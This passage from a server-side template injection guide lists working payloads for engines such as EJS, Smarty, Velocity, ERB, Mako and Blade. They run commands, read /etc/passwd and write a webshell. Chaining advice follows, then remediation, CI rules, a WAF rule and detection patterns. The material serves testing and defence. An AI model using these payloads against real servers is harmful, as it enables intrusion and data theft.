#### EJS (Node) - Comprehensive Payloads

```javascript
# Detection
<%= 7*7 %>

# RCE via global process
<%- global.process.mainModule.require('child_process').execSync('id') %>

# Alternative syntax
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>

# Via constructor
<%- process.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>

# Function constructor
<%- global.process.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')() %>

# Via this
<%- this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') %>

# Compact version
<%- process.mainModule.require('child_process').execSync('id') %>
```

#### Smarty (PHP) - Comprehensive Payloads

```php
# Version disclosure
{$smarty.version}

# PHP tag (if enabled)
{php}echo `id`;{/php}

# Static method call
{system('id')}

# Write webshell via Smarty_Internal_Write_File
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}

# Via self
{self::getStreamVariable("file:///etc/passwd")}

# Math function with system
{math equation="passthru('id')"}

# Function call
{function name=foo}{system('id')}{/function}{call foo}
```

#### Velocity (Java) - Comprehensive Payloads

```java
# Detection
$7*7

# RCE via Runtime.exec
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

# Via ProcessBuilder
#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
#set($proc=$pb.getConstructor($class.array("java.lang.String").type).newInstance($class.array("java.lang.String").type.cast(["bash","-c","id"])))
$proc.start()

# Alternative
#set($process=$class.forName("java.lang.Runtime").getRuntime().exec("id"))
```

#### Ruby ERB - Comprehensive Payloads

```ruby
# Detection
<%= 7*7 %>

# RCE via system
<%= system("id") %>

# Via backticks
<%= `id` %>

# Via IO.popen
<%= IO.popen("id").read %>

# Via exec
<%= exec("id") %>

# File operations
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>

# Via Open3
<%= require 'open3'; Open3.capture3("id")[0] %>
```

#### Nunjucks (Node) - Comprehensive Payloads

```javascript
# Detection
{{7*7}}

# RCE via range constructor
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}

# Via process
{{process.mainModule.require('child_process').execSync('id')}}

# Function constructor
{{constructor.constructor("return process.mainModule.require('child_process').execSync('id')")()}}
```

#### Liquid (Ruby) - Limited Payloads

```ruby
# Detection
{{7 | times: 7}}

# Access objects
{{product.title}}
{{collection.products}}

# Limited file system access (Shopify)
{{"{% include 'snippets/file.liquid' %}"}}

# String manipulation
{{"admin" | append: ".txt" | file}}

# Note: Liquid is heavily sandboxed by design
# RCE is very difficult without custom filters/tags
```

#### ASP.NET Razor - Comprehensive Payloads

```csharp
# Detection
@(1+2)  →  3
@(7*7)  →  49

# RCE via Process.Start
@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");

# Via PowerShell
@System.Diagnostics.Process.Start("powershell.exe","-c whoami");

# File read
@System.IO.File.ReadAllText("C:/Windows/System32/drivers/etc/hosts")

# Environment variables
@System.Environment.GetEnvironmentVariables()

# Classic ASP (VBScript)
<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>
```

#### Go Templates - Limited Payloads

```go
# Detection
{{7}}  # Go templates don't have arithmetic
{{.System "ls"}}  # Only if custom function exposed

# Template variables
{{.}}
{{.Field}}

# Call methods (if exposed)
{{.Method}}
{{call .Function}}

# Note: Go's text/template and html/template are generally safe by design
# RCE requires custom functions to be registered by the application
```

#### Mako (Python) - Comprehensive Payloads

```python
# Detection
${7*7}

# RCE via module
${self.module.os.popen('id').read()}

# Via cache
${self.module.cache.util.os.popen('id').read()}

# Import and execute
<%
import os
result = os.popen('id').read()
%>
${result}

# File operations
${self.module.os.listdir('/')}
${open('/etc/passwd').read()}
```

#### Blade (Laravel) - Comprehensive Payloads

```php
# Detection
{{ 7*7 }}

# Artisan commands
{!!\\Illuminate\\Support\\Facades\\Artisan::call('about')!!}

# Via system
{!! system('id') !!}

# PHP execution (unescaped)
{!! exec('id') !!}

# File read
{!! file_get_contents('/etc/passwd') !!}

# Eval (if available)
@php
system('id');
@endphp

# Via shell_exec
{!! shell_exec('id') !!}
```

### Comprehensive Payload References

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayloadBox - SSTI](https://github.com/payloadbox/ssti-payloads)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

## Chaining and Escalation

SSTI often leads directly to RCE, but can also be used for:

- **RCE:** Primary goal, gain shell access.
- **File Exfiltration:** Read sensitive files (`/etc/passwd`, `web.config`, source code, credentials).
- **Information Disclosure:** Dump environment variables, application configuration (`{{config}}`, `{{settings}}`), object properties, internal network paths.
- **Internal Network Access:** Use RCE to pivot, scan internal networks, or access internal services.
- **Privilege Escalation:** Combine RCE with local exploits if the web server runs with elevated privileges.
- **Data Exfiltration:** Send internal data to an attacker-controlled server (e.g., via HTTP requests or DNS exfiltration from within the template code).
- **SSRF pivot:** Some engines permit URL‑fetch filters (`{{''|fetch('http://...')}}`); leverage SSTI to query cloud‑metadata endpoints.
- **Container Escape:** Access Docker socket or Kubernetes API from within containerized applications.
- **Cloud Credential Theft:** Extract IAM credentials from cloud metadata services (AWS/GCP/Azure).

## Remediation Recommendations

> [!WARNING]
> Prevention is critical. Never trust user input in template contexts, and always use the safest available configuration.

### Developer Best Practices

- **Never Render User Input Directly:** The most critical step. Treat user input as data, not code.
- **Use Safe Templating Practices:**
  - Pass user data into templates using dedicated template variables (e.g., `render_template('page.html', user_data=user_input)`).
  - Use logic-less templates if possible.
- **Sanitize and Validate:** If rendering user input is unavoidable (e.g., CMS), rigorously sanitize it. Remove or escape all template syntax characters (`{`, `}`, `$`, `%`, `<`, `>`, etc.). Use allow-lists for safe HTML if needed.
- **Use Sandboxed Environments:** Configure the template engine's sandbox if available and effective for the specific engine. Be aware that sandboxes can often be bypassed.
- **Choose Safer Engines:** Prefer engines designed for security, like Go's `html/template` over `text/template` for HTML output, as it provides context-aware auto-escaping.

### Secure Configuration Examples

#### Python / Flask / Jinja2

```python
from flask import Flask, render_template_string
from markupsafe import escape

app = Flask(__name__)

# SECURE: Pass user input as variable
@app.route('/')
def secure_endpoint():
    user_input = request.args.get('name', '')
    # Method 1: Use template variables (RECOMMENDED)
    return render_template('template.html', user_name=user_input)

    # Method 2: If using render_template_string, pass as variable
    template = "Welcome {{ user_name }}"
    return render_template_string(template, user_name=user_input)

# ADDITIONAL: Configure Jinja2 environment securely
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment(
    autoescape=True,  # Enable auto-escaping
    trim_blocks=True,
    lstrip_blocks=True
)

# Disable dangerous globals
env.globals.clear()
# Only add safe functions
env.globals['safe_function'] = safe_function
```

#### PHP / Symfony / Twig

```php
// SECURE: Use Twig variables
use Twig\Environment;
use Twig\Loader\FilesystemLoader;
use Twig\Extension\SandboxExtension;
use Twig\Sandbox\SecurityPolicy;

$loader = new FilesystemLoader(__DIR__ . '/templates');
$twig = new Environment($loader, [
    'autoescape' => 'html',  // Enable auto-escaping
    'strict_variables' => true,  // Throw error on undefined variables
]);

// Enable sandbox
$tags = ['if', 'for'];  // Allowed tags
$filters = ['escape', 'upper', 'lower'];  // Allowed filters
$functions = [];  // No functions allowed
$methods = [];  // No method calls allowed
$properties = [];  // No property access allowed

$policy = new SecurityPolicy($tags, $filters, $methods, $properties, $functions);
$sandbox = new SandboxExtension($policy, true);  // true = sandbox all templates
$twig->addExtension($sandbox);

// Render with user input as variable
echo $twig->render('template.html.twig', ['user_name' => $userInput]);
```

#### Java / Spring Boot / Thymeleaf

```java
// application.properties - Disable SpEL in Thymeleaf
spring.thymeleaf.cache=true
spring.thymeleaf.enable-spring-el-compiler=false

// Secure controller
@Controller
public class SecureController {

    @GetMapping("/greet")
    public String greet(@RequestParam String name, Model model) {
        // SECURE: Pass user input as model attribute
        model.addAttribute("userName", name);
        return "greeting";  // Returns greeting.html template
    }

    // ADDITIONAL: Input validation
    @GetMapping("/greet-validated")
    public String greetValidated(
        @RequestParam
        @Pattern(regexp = "^[a-zA-Z0-9 ]{1,50}$", message = "Invalid name format")
        String name,
        Model model
    ) {
        model.addAttribute("userName", name);
        return "greeting";
    }
}

// greeting.html - Use text substitution, not unescaped
// SECURE:
<p th:text="'Hello, ' + ${userName}">Hello, User</p>

// INSECURE (avoid):
<p th:utext="${userName}">Hello, User</p>
```

#### Node.js / Express / Multiple Engines

```javascript
const express = require('express');
const app = express();

// EJS - Secure configuration
app.set('view engine', 'ejs');
app.set('view options', {
    // Disable 'with' statement (prevents scope pollution)
    // Note: This is default in EJS 3.x
    _with: false,
    // Disable debug compilation
    compileDebug: false,
    // Use async rendering (safer)
    async: true
});

// SECURE: Pass user input as variable
app.get('/greet', (req, res) => {
    const userName = req.query.name || 'Guest';
    // Method 1: Use res.render with data object
    res.render('greeting', { userName: userName });
});

// Handlebars - Secure configuration with no helpers
const exphbs = require('express-handlebars');

const hbs = exphbs.create({
    defaultLayout: 'main',
    // Don't allow prototype properties
    helpers: {}, // Empty helpers object
    runtimeOptions: {
        allowProtoPropertiesByDefault: false,
        allowProtoMethodsByDefault: false
    }
});

app.engine('handlebars', hbs.engine);
app.set('view engine', 'handlebars');

// Pug - Secure usage
app.set('view engine', 'pug');
app.get('/greet-pug', (req, res) => {
    // Input validation
    const userName = req.query.name?.replace(/[^a-zA-Z0-9 ]/g, '') || 'Guest';
    res.render('greeting', { userName: userName });
});

// NEVER DO THIS (vulnerable):
// const ejs = require('ejs');
// app.get('/vulnerable', (req, res) => {
//     const template = ejs.compile(req.query.template);  // DANGEROUS
//     res.send(template());
// });
```

### Infrastructure & Security Controls

- **Principle of Least Privilege:** Run the web application process with minimal privileges.
- **Input Validation:** Validate input against expected formats (e.g., email, number) before it reaches the template layer.
- **Patch management:** track and apply security updates for template engines (see Recent CVEs).
- **Harden runtime:** enable seccomp/AppArmor or gVisor so that even a successful RCE has minimal kernel attack surface.
- **Network Segmentation:** Restrict outbound connections from web servers to prevent SSRF and data exfiltration.
- **File System Restrictions:** Use chroot, containers, or similar mechanisms to limit file system access.

### CI/CD Integration

- **CI guardrails:** block usage of dangerous APIs (e.g., `render_template_string`, `Template.compile`, `eval` filters) via linters/semgrep; add approve‑list of safe helpers
- **Static Analysis:** Integrate semgrep, CodeQL, or similar tools in CI pipelines
  ```yaml
  # .github/workflows/security.yml
  - name: Run Semgrep
    uses: returntocorp/semgrep-action@v1
    with:
      config: >-
        p/security-audit
        p/ssti
  ```

- **Dependency Scanning:** Monitor for vulnerable template engine versions
  ```yaml
  - name: Check dependencies
    run: |
      pip install safety
      safety check
  ```

- **Pre-commit Hooks:**
  ```yaml
  # .pre-commit-config.yaml
  repos:
    - repo: https://github.com/returntocorp/semgrep
      rev: v1.45.0
      hooks:
        - id: semgrep
          args: ['--config', 'p/ssti', '--error']
  ```

### Runtime Protection

- **Web Application Firewall (WAF):** Configure rules to detect SSTI patterns
  ```nginx
  # ModSecurity rule example
  SecRule REQUEST_URI|ARGS|ARGS_NAMES "@rx (\{\{|\}\}|\{%|%\}|<\%|\%>|\$\{)" \
      "id:1001,phase:2,deny,status:403,msg:'Potential SSTI attempt'"
  ```

- **Container Security:**
  ```dockerfile
  # Dockerfile hardening
  FROM python:3.12-slim

  # Run as non-root user
  RUN useradd -m -u 1000 appuser
  USER appuser

  # Read-only root filesystem
  # Use at runtime: docker run --read-only --tmpfs /tmp
  ```

- **Kubernetes Security Policies:**
  ```yaml
  apiVersion: policy/v1beta1
  kind: PodSecurityPolicy
  metadata:
    name: restricted-ssti
  spec:
    privileged: false
    runAsUser:
      rule: MustRunAsNonRoot
    seLinux:
      rule: RunAsAny
    fsGroup:
      rule: RunAsAny
    readOnlyRootFilesystem: true
  ```

### Monitoring & Detection

- **Log SSTI Indicators:**
  ```python
  import logging

  SSTI_PATTERNS = ['{{', '}}', '{%', '%}', '<%', '%>', '${']

  def check_ssti_attempt(user_input):
      for pattern in SSTI_PATTERNS:
          if pattern in user_input:
              logging.warning(f"Potential SSTI attempt: {user_input}")
              # Alert security team
              alert_security_team(user_input)
  ```

- **SIEM Rules:** Configure alerts for SSTI patterns in web logs

- **Anomaly Detection:** Monitor for unusual process execution from web server processes
